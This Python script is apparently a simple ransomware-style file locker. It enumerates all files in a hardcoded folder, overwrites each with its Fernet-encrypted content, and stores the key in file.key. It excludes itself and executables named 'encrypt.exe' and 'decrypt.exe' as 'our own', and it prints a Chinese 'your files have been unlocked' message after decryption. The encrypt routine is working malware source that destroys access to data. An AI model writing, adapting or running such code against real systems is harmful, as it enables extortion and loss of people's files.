import os
import fernet
# import unicode


class SecMod:
    def __init__(self):
        self.files = []
        # upath = unicode("D:\\运维手册", 'utf-8')
        os.chdir("D:\\a")
        for file in os.listdir():
            # 排除“自己人”
            if file == "file.key" or file == "加密.exe" or file == "解密.exe":
                continue
            if os.path.isfile(file):
                # 获取该路径下文件的list列表
                self.files.append(file)
            print(file)

    def encrypt(self):
        key = fernet.Fernet.generate_key()
        with open("file.key", "wb") as thekey:
            thekey.write(key)
        for file in self.files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
                contents_encrypted = fernet.Fernet(key).encrypt(contents)
                print(contents_encrypted)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
            print(file)

    def decrypt(self):
        with open("file.key", "rb") as key:
            rightkey = key.read()
        for file in self.files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = fernet.Fernet(rightkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("恭喜，你的文件已成功解锁")


if __name__ == '__main__':
    sm = SecMod()
    sm.decrypt()
